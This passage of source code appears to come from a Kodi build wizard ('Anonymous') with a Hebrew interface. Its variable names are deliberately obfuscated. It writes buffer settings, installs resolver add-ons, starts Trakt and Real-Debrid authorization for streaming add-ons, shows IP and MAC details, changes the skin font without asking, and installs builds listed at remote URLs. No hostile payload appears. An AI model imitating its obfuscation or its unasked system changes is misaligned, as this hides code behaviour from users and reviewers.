	OOO0OO0O00000000O =xbmc .getInfoLabel ("System.Memory(total)")#line:1667
	O0O000O0O0OOOOO0O =xbmc .getInfoLabel ("System.FreeMemory")#line:1668
	OO00OOO0O00O0O00O =re .sub ('[^0-9]','',O0O000O0O0OOOOO0O )#line:1669
	OO00OOO0O00O0O00O =int (OO00OOO0O00O0O00O )/3 #line:1670
	OOOOOO000OO000O00 =OO00OOO0O00O0O00O *1024 *1024 #line:1671
	try :OO0OO0000O00O0O0O =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1672
	except :OO0OO0000O00O0O0O =16 #line:1673
	O0OOO0O00O0OO0000 =DIALOG .yesno ('FREE MEMORY: '+str (O0O000O0O0OOOOO0O ),'Based on your free Memory your optimal buffersize is: '+str (OO00OOO0O00O0O00O )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1676
	if O0OOO0O00O0OO0000 ==1 :#line:1677
		with open (O00O0O0O000O0O000 ,"w")as OOO0OOOO0O0OOOOOO :#line:1678
			if OO0OO0000O00O0O0O >=17 :OOO00O0OO00000OO0 =xml_data_advSettings_New (str (OOOOOO000OO000O00 ))#line:1679
			else :OOO00O0OO00000OO0 =xml_data_advSettings_old (str (OOOOOO000OO000O00 ))#line:1680
			OOO0OOOO0O0OOOOOO .write (OOO00O0OO00000OO0 )#line:1682
			DIALOG .ok ('Buffer Size Set to: '+str (OOOOOO000OO000O00 ),'Please restart Kodi for settings to apply.','')#line:1683
	elif O0OOO0O00O0OO0000 ==0 :#line:1685
		OOOOOO000OO000O00 =_OOOOO0OO0O000O0OO (default =str (OOOOOO000OO000O00 ),heading ="INPUT BUFFER SIZE")#line:1686
		with open (O00O0O0O000O0O000 ,"w")as OOO0OOOO0O0OOOOOO :#line:1687
			if OO0OO0000O00O0O0O >=17 :OOO00O0OO00000OO0 =xml_data_advSettings_New (str (OOOOOO000OO000O00 ))#line:1688
			else :OOO00O0OO00000OO0 =xml_data_advSettings_old (str (OOOOOO000OO000O00 ))#line:1689
			OOO0OOOO0O0OOOOOO .write (OOO00O0OO00000OO0 )#line:1690
			DIALOG .ok ('Buffer Size Set to: '+str (OOOOOO000OO000O00 ),'Please restart Kodi for settings to apply.','')#line:1691
def xml_data_advSettings_old (O0O0O0OOO0O0O00OO ):#line:1692
	OO00000O0OOO00OOO ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%O0O0O0OOO0O0O00OO #line:1702
	return OO00000O0OOO00OOO #line:1703
def xml_data_advSettings_New (O0O00OO00OO0O00OO ):#line:1705
	O0O00O00O000O0OOO ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%O0O00OO00OO0O00OO #line:1717
	return O0O00O00O000O0OOO #line:1718
def write_ADV_SETTINGS_XML (OOOO0OO0OO0O0O000 ):#line:1719
    if not os .path .exists (xml_file ):#line:1720
        with open (xml_file ,"w")as OOOOOOO0OOO0OO00O :#line:1721
            OOOOOOO0OOO0OO00O .write (xml_data )#line:1722
def _OOOOO0OO0O000O0OO (default ="",heading ="",hidden =False ):#line:1723
    ""#line:1724
    O0000O0O00OOOOOO0 =xbmc .Keyboard (default ,heading ,hidden )#line:1725
    O0000O0O00OOOOOO0 .doModal ()#line:1726
    if (O0000O0O00OOOOOO0 .isConfirmed ()):#line:1727
        return unicode (O0000O0O00OOOOOO0 .getText (),"utf-8")#line:1728
    return default #line:1729
def index ():#line:1731
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:1732
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1733
	if AUTOUPDATE =='Yes':#line:1734
		if wiz .workingURL (WIZARDFILE )==True :#line:1735
			O0OO00O00OO00OOOO =wiz .checkWizard ('version')#line:1736
			if O0OO00O00OO00OOOO >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O0OO00O00OO00OOOO ),'wizardupdate',themeit =THEME2 )#line:1737
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1738
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1739
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1740
	if len (BUILDNAME )>0 :#line:1741
		O00OOO0000O00OOO0 =wiz .checkBuild (BUILDNAME ,'version')#line:1742
		OO0OO0O0O0OO0O00O ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:1743
		if O00OOO0000O00OOO0 >BUILDVERSION :OO0OO0O0O0OO0O00O ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(OO0OO0O0O0OO0O00O ,O00OOO0000O00OOO0 )#line:1744
		addDir (OO0OO0O0O0OO0O00O ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:1746
		try :#line:1748
		     O000000O0O00OOOOO =wiz .themeCount (BUILDNAME )#line:1749
		except :#line:1750
		   O000000O0O00OOOOO =False #line:1751
		if not O000000O0O00OOOOO ==False :#line:1752
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:1753
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:1754
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:1757
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1758
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1759
	addFile ('אימות חשבון + RD','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:1763
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:1765
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:1767
def morsetup ():#line:1769
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:1770
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:1771
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:1772
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:1776
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:1777
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:1780
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:1781
	addFile ('הגדר מצב RD','rdon',icon =ICONMAINT ,themeit =THEME1 )#line:1782
	addFile ('ביטול מצב RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:1783
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:1791
	setView ('files','viewType')#line:1792
def morsetup2 ():#line:1793
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:1794
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:1795
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:1796
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:1797
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:1798
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:1799
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:1800
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:1801
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:1802
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:1803
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:1804
def fastupdate ():#line:1805
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:1806
def forcefastupdate ():#line:1808
			OOOO0O000O000OOO0 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:1809
			wiz .ForceFastUpDate (ADDONTITLE ,OOOO0O000O000OOO0 )#line:1810
def rdsetup ():#line:1814
	if not xbmc .getCondVisibility ('System.HasAddon(script.module.resolveurl)'):#line:1815
		xbmc .executebuiltin ("InstallAddon(script.module.resolveurl)")#line:1816
	if not xbmc .getCondVisibility ('System.HasAddon(script.module.urlresolver)'):#line:1817
		xbmc .executebuiltin ("InstallAddon(script.module.urlresolver)")#line:1818
	addFile ('[COLOR red]ResolverUrl[/COLOR] [COLOR gold]Real-Debrid Authorization[/COLOR]','resolveurl',fanart =FANART ,icon =ICONSAVE ,themeit =THEME2 )#line:1819
	addFile ('[COLOR blue]URLResolver[/COLOR] [COLOR gold]Real-Debrid Authorization[/COLOR]','urlresolver',fanart =FANART ,icon =ICONSAVE ,themeit =THEME2 )#line:1820
	setView ('files','viewType')#line:1821
def traktsetup ():#line:1823
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1824
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1825
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1826
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1827
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1828
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1829
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1830
	setView ('files','viewType')#line:1831
def resolveurlsetup ():#line:1833
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:1834
def urlresolversetup ():#line:1835
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:1836
def placentasetup ():#line:1838
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:1839
def reptiliasetup ():#line:1840
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:1841
def flixnetsetup ():#line:1842
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:1843
def yodasetup ():#line:1844
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:1845
def numberssetup ():#line:1846
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:1847
def uranussetup ():#line:1848
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:1849
def genesissetup ():#line:1850
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:1851
def net_tools (view =None ):#line:1853
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:1854
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1855
	setView ('files','viewType')#line:1857
def speedMenu ():#line:1858
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:1859
def viewIP ():#line:1860
	OOO0OOO000OOO0OO0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:1874
	O00OOOOOO0O00000O =[];OO000O0OO0OO0O0O0 =0 #line:1875
	for OOOOO0OO00O0O0O00 in OOO0OOO000OOO0OO0 :#line:1876
		O0OO000O0O0OO00O0 =wiz .getInfo (OOOOO0OO00O0O0O00 )#line:1877
		OOO000O0O0O0O0OO0 =0 #line:1878
		while O0OO000O0O0OO00O0 =="Busy"and OOO000O0O0O0O0OO0 <10 :#line:1879
			O0OO000O0O0OO00O0 =wiz .getInfo (OOOOO0OO00O0O0O00 );OOO000O0O0O0O0OO0 +=1 ;wiz .log ("%s sleep %s"%(OOOOO0OO00O0O0O00 ,str (OOO000O0O0O0O0OO0 )));xbmc .sleep (1000 )#line:1880
		O00OOOOOO0O00000O .append (O0OO000O0O0OO00O0 )#line:1881
		OO000O0OO0OO0O0O0 +=1 #line:1882
	OOO0OOOO00O0O0O00 ,O0O00OO0OO0O0000O ,OOO0OOOO00O00OOO0 =getIP ()#line:1883
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOOOOO0O00000O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1884
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OOOO00O0O0O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1885
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00OO0OO0O0000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1886
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OOOO00O00OOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1887
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOOOOO0O00000O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1888
	setView ('files','viewType')#line:1889
def buildMenu ():#line:1891
	if USERNAME =='':#line:1892
		ADDON .openSettings ()#line:1893
		sys .exit ()#line:1894
	if PASSWORD =='':#line:1895
		ADDON .openSettings ()#line:1896
	OOOO0O000O000000O =u_list (SPEEDFILE )#line:1897
	(OOOO0O000O000000O )#line:1898
	OOO000OO0OOOO00O0 =(wiz .workingURL (OOOO0O000O000000O ))#line:1899
	(OOO000OO0OOOO00O0 )#line:1900
	OOO000OO0OOOO00O0 =wiz .workingURL (SPEEDFILE )#line:1901
	if not OOO000OO0OOOO00O0 ==True :#line:1902
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1903
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:1904
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1905
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:1906
		addFile ('%s'%OOO000OO0OOOO00O0 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:1907
	else :#line:1908
		OO0OOO0OO0OO0000O ,OO000OO0OO000OOO0 ,OOOO0000OO0000000 ,OO0OOOO0O0O0O00OO ,O00O0000OOO00OOO0 ,OO00OO000OO0OOO0O ,O0OO00OO0O000OOOO =wiz .buildCount ()#line:1909
		O000O0OOO00000000 =False ;OO00O0OO0O0000000 =[]#line:1910
		if THIRDPARTY =='true':#line:1911
			if not THIRD1NAME ==''and not THIRD1URL =='':O000O0OOO00000000 =True ;OO00O0OO0O0000000 .append ('1')#line:1912
			if not THIRD2NAME ==''and not THIRD2URL =='':O000O0OOO00000000 =True ;OO00O0OO0O0000000 .append ('2')#line:1913
			if not THIRD3NAME ==''and not THIRD3URL =='':O000O0OOO00000000 =True ;OO00O0OO0O0000000 .append ('3')#line:1914
		O000OOOO0OO0OOO0O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:1915
		O00O00O0OOOO0OO00 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O000OOOO0OO0OOO0O )#line:1916
		if OO0OOO0OO0OO0000O ==1 and O000O0OOO00000000 ==False :#line:1917
			for O000O0OO00OO00000 ,O0OOO0O000O0OO000 ,OOO0O0OOO000OOO0O ,O0OO0O00O000OO000 ,O0OO0O0OO0000O0OO ,O000OO00OOO00O0O0 ,O0000O0OOO0OOOOO0 ,O00OO000O00O000O0 ,O0O00000OOO00O00O ,O0OO0OO0O00O0O0O0 in O00O00O0OOOO0OO00 :#line:1918
				if not SHOWADULT =='true'and O0O00000OOO00O00O .lower ()=='yes':continue #line:1919
				if not DEVELOPER =='true'and wiz .strTest (O000O0OO00OO00000 ):continue #line:1920
				viewBuild (O00O00O0OOOO0OO00 [0 ][0 ])#line:1921
				return #line:1922
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1925
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1926
		if O000O0OOO00000000 ==True :#line:1927
			for O000OOO00O0OO00O0 in OO00O0OO0O0000000 :#line:1928
				O000O0OO00OO00000 =eval ('THIRD%sNAME'%O000OOO00O0OO00O0 )#line:1929
		if len (O00O00O0OOOO0OO00 )>=1 :#line:1931
			if SEPERATE =='true':#line:1932
				for O000O0OO00OO00000 ,O0OOO0O000O0OO000 ,OOO0O0OOO000OOO0O ,O0OO0O00O000OO000 ,O0OO0O0OO0000O0OO ,O000OO00OOO00O0O0 ,O0000O0OOO0OOOOO0 ,O00OO000O00O000O0 ,O0O00000OOO00O00O ,O0OO0OO0O00O0O0O0 in O00O00O0OOOO0OO00 :#line:1933
					if not SHOWADULT =='true'and O0O00000OOO00O00O .lower ()=='yes':continue #line:1934
					if not DEVELOPER =='true'and wiz .strTest (O000O0OO00OO00000 ):continue #line:1935
					O0OO0OO0OOO0O0O0O =createMenu ('install','',O000O0OO00OO00000 )#line:1936
					addDir ('[%s] %s (v%s)'%(float (O0OO0O0OO0000O0OO ),O000O0OO00OO00000 ,O0OOO0O000O0OO000 ),'viewbuild',O000O0OO00OO00000 ,description =O0OO0OO0O00O0O0O0 ,fanart =O00OO000O00O000O0 ,icon =O0000O0OOO0OOOOO0 ,menu =O0OO0OO0OOO0O0O0O ,themeit =THEME2 )#line:1937
			else :#line:1938
				if OO0OOOO0O0O0O00OO >0 :#line:1939
					O0O00O000O000OO00 ='+'if SHOW17 =='false'else '-'#line:1940
					if SHOW17 =='true':#line:1942
						for O000O0OO00OO00000 ,O0OOO0O000O0OO000 ,OOO0O0OOO000OOO0O ,O0OO0O00O000OO000 ,O0OO0O0OO0000O0OO ,O000OO00OOO00O0O0 ,O0000O0OOO0OOOOO0 ,O00OO000O00O000O0 ,O0O00000OOO00O00O ,O0OO0OO0O00O0O0O0 in O00O00O0OOOO0OO00 :#line:1944
							if not SHOWADULT =='true'and O0O00000OOO00O00O .lower ()=='yes':continue #line:1945
							if not DEVELOPER =='true'and wiz .strTest (O000O0OO00OO00000 ):continue #line:1946
							OOOOOO0000OO000OO =int (float (O0OO0O0OO0000O0OO ))#line:1947
							if OOOOOO0000OO000OO ==17 :#line:1948
								O0OO0OO0OOO0O0O0O =createMenu ('install','',O000O0OO00OO00000 )#line:1949
								addDir ('[%s] %s (v%s)'%(float (O0OO0O0OO0000O0OO ),O000O0OO00OO00000 ,O0OOO0O000O0OO000 ),'viewbuild',O000O0OO00OO00000 ,description =O0OO0OO0O00O0O0O0 ,fanart =O00OO000O00O000O0 ,icon =O0000O0OOO0OOOOO0 ,menu =O0OO0OO0OOO0O0O0O ,themeit =THEME2 )#line:1950
				if O00O0000OOO00OOO0 >0 :#line:1951
					O0O00O000O000OO00 ='+'if SHOW18 =='false'else '-'#line:1952
					if SHOW18 =='true':#line:1954
						for O000O0OO00OO00000 ,O0OOO0O000O0OO000 ,OOO0O0OOO000OOO0O ,O0OO0O00O000OO000 ,O0OO0O0OO0000O0OO ,O000OO00OOO00O0O0 ,O0000O0OOO0OOOOO0 ,O00OO000O00O000O0 ,O0O00000OOO00O00O ,O0OO0OO0O00O0O0O0 in O00O00O0OOOO0OO00 :#line:1956
							if not SHOWADULT =='true'and O0O00000OOO00O00O .lower ()=='yes':continue #line:1957
							if not DEVELOPER =='true'and wiz .strTest (O000O0OO00OO00000 ):continue #line:1958
							OOOOOO0000OO000OO =int (float (O0OO0O0OO0000O0OO ))#line:1959
							if OOOOOO0000OO000OO ==18 :#line:1960
								O0OO0OO0OOO0O0O0O =createMenu ('install','',O000O0OO00OO00000 )#line:1961
								addDir ('[%s] %s (v%s)'%(float (O0OO0O0OO0000O0OO ),O000O0OO00OO00000 ,O0OOO0O000O0OO000 ),'viewbuild',O000O0OO00OO00000 ,description =O0OO0OO0O00O0O0O0 ,fanart =O00OO000O00O000O0 ,icon =O0000O0OOO0OOOOO0 ,menu =O0OO0OO0OOO0O0O0O ,themeit =THEME2 )#line:1962
				if OOOO0000OO0000000 >0 :#line:1963
					O0O00O000O000OO00 ='+'if SHOW16 =='false'else '-'#line:1964
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(O0O00O000O000OO00 ,OOOO0000OO0000000 ),'togglesetting','show16',themeit =THEME3 )#line:1965
					if SHOW16 =='true':#line:1966
						for O000O0OO00OO00000 ,O0OOO0O000O0OO000 ,OOO0O0OOO000OOO0O ,O0OO0O00O000OO000 ,O0OO0O0OO0000O0OO ,O000OO00OOO00O0O0 ,O0000O0OOO0OOOOO0 ,O00OO000O00O000O0 ,O0O00000OOO00O00O ,O0OO0OO0O00O0O0O0 in O00O00O0OOOO0OO00 :#line:1967
							if not SHOWADULT =='true'and O0O00000OOO00O00O .lower ()=='yes':continue #line:1968
							if not DEVELOPER =='true'and wiz .strTest (O000O0OO00OO00000 ):continue #line:1969
							OOOOOO0000OO000OO =int (float (O0OO0O0OO0000O0OO ))#line:1970
							if OOOOOO0000OO000OO ==16 :#line:1971
								O0OO0OO0OOO0O0O0O =createMenu ('install','',O000O0OO00OO00000 )#line:1972
								addDir ('[%s] %s (v%s)'%(float (O0OO0O0OO0000O0OO ),O000O0OO00OO00000 ,O0OOO0O000O0OO000 ),'viewbuild',O000O0OO00OO00000 ,description =O0OO0OO0O00O0O0O0 ,fanart =O00OO000O00O000O0 ,icon =O0000O0OOO0OOOOO0 ,menu =O0OO0OO0OOO0O0O0O ,themeit =THEME2 )#line:1973
				if OO000OO0OO000OOO0 >0 :#line:1974
					O0O00O000O000OO00 ='+'if SHOW15 =='false'else '-'#line:1975
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(O0O00O000O000OO00 ,OO000OO0OO000OOO0 ),'togglesetting','show15',themeit =THEME3 )#line:1976
					if SHOW15 =='true':#line:1977
						for O000O0OO00OO00000 ,O0OOO0O000O0OO000 ,OOO0O0OOO000OOO0O ,O0OO0O00O000OO000 ,O0OO0O0OO0000O0OO ,O000OO00OOO00O0O0 ,O0000O0OOO0OOOOO0 ,O00OO000O00O000O0 ,O0O00000OOO00O00O ,O0OO0OO0O00O0O0O0 in O00O00O0OOOO0OO00 :#line:1978
							if not SHOWADULT =='true'and O0O00000OOO00O00O .lower ()=='yes':continue #line:1979
							if not DEVELOPER =='true'and wiz .strTest (O000O0OO00OO00000 ):continue #line:1980
							OOOOOO0000OO000OO =int (float (O0OO0O0OO0000O0OO ))#line:1981
							if OOOOOO0000OO000OO <=15 :#line:1982
								O0OO0OO0OOO0O0O0O =createMenu ('install','',O000O0OO00OO00000 )#line:1983
								addDir ('[%s] %s (v%s)'%(float (O0OO0O0OO0000O0OO ),O000O0OO00OO00000 ,O0OOO0O000O0OO000 ),'viewbuild',O000O0OO00OO00000 ,description =O0OO0OO0O00O0O0O0 ,fanart =O00OO000O00O000O0 ,icon =O0000O0OOO0OOOOO0 ,menu =O0OO0OO0OOO0O0O0O ,themeit =THEME2 )#line:1984
		elif O0OO00OO0O000OOOO >0 :#line:1985
			if OO00OO000OO0OOO0O >0 :#line:1986
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:1987
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:1988
			else :#line:1989
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:1990
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:1991
	setView ('files','viewType')#line:1992
def viewBuild (O0O0O000000OOOOO0 ):#line:1994
	OO0O00OO000000O00 =wiz .workingURL (SPEEDFILE )#line:1995
	if not OO0O00OO000000O00 ==True :#line:1996
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:1997
		addFile ('%s'%OO0O00OO000000O00 ,'',themeit =THEME3 )#line:1998
		return #line:1999
	if wiz .checkBuild (O0O0O000000OOOOO0 ,'version')==False :#line:2000
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2001
		addFile ('%s was not found in the builds list.'%O0O0O000000OOOOO0 ,'',themeit =THEME3 )#line:2002
		return #line:2003
	OOO000O0OOOOO000O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2004
	O0O00O0O00O0OO00O =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0O0O000000OOOOO0 ).findall (OOO000O0OOOOO000O )#line:2005
	for O0OO000O00O0O0OOO ,OO00O0OOO00OOO0O0 ,O0000OO0OOOO0O0OO ,OO0O0O0OO000OO000 ,OO0000OOOO0OO00OO ,O0000OO00000000OO ,OO0O00000OOO0OOO0 ,OOOOOO000O0OOOO00 ,O0O0O0OO0O0OOO00O ,OO00OOOO00OOO0O0O in O0O00O0O00O0OO00O :#line:2006
		O0000OO00000000OO =O0000OO00000000OO if wiz .workingURL (O0000OO00000000OO )else ICON #line:2007
		OO0O00000OOO0OOO0 =OO0O00000OOO0OOO0 if wiz .workingURL (OO0O00000OOO0OOO0 )else FANART #line:2008
		O0O000O0OOO0OO00O ='%s (v%s)'%(O0O0O000000OOOOO0 ,O0OO000O00O0O0OOO )#line:2009
		if BUILDNAME ==O0O0O000000OOOOO0 and O0OO000O00O0O0OOO >BUILDVERSION :#line:2010
			O0O000O0OOO0OO00O ='%s [COLOR red][CURRENT v%s][/COLOR]'%(O0O000O0OOO0OO00O ,BUILDVERSION )#line:2011
		OOO0O00O0O000OOO0 =int (float (KODIV ));O000OOO00000OOO00 =int (float (OO0O0O0OO000OO000 ))#line:2020
		if not OOO0O00O0O000OOO0 ==O000OOO00000OOO00 :#line:2021
			if OOO0O00O0O000OOO0 ==16 and O000OOO00000OOO00 <=15 :O0OOO0O00O0OO0OO0 =False #line:2022
			else :O0OOO0O00O0OO0OO0 =True #line:2023
		else :O0OOO0O00O0OO0OO0 =False #line:2024
		addFile ('התקנה','install',O0O0O000000OOOOO0 ,'fresh',description =OO00OOOO00OOO0O0O ,fanart =OO0O00000OOO0OOO0 ,icon =O0000OO00000000OO ,themeit =THEME1 )#line:2028
		if not OO0000OOOO0OO00OO =='http://':#line:2031
			if wiz .workingURL (OO0000OOOO0OO00OO )==True :#line:2032
				addFile (wiz .sep ('THEMES'),'',fanart =OO0O00000OOO0OOO0 ,icon =O0000OO00000000OO ,themeit =THEME3 )#line:2033
				OOO000O0OOOOO000O =wiz .openURL (OO0000OOOO0OO00OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2034
				O0O00O0O00O0OO00O =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOO000O0OOOOO000O )#line:2035
				for O000OOO0OO0O000OO ,OO00OOO0000OO00OO ,O0OOOOO00OOO00OOO ,O0OOO000O0OOOOO0O ,O0O000O0OO000O0OO ,OO00OOOO00OOO0O0O in O0O00O0O00O0OO00O :#line:2036
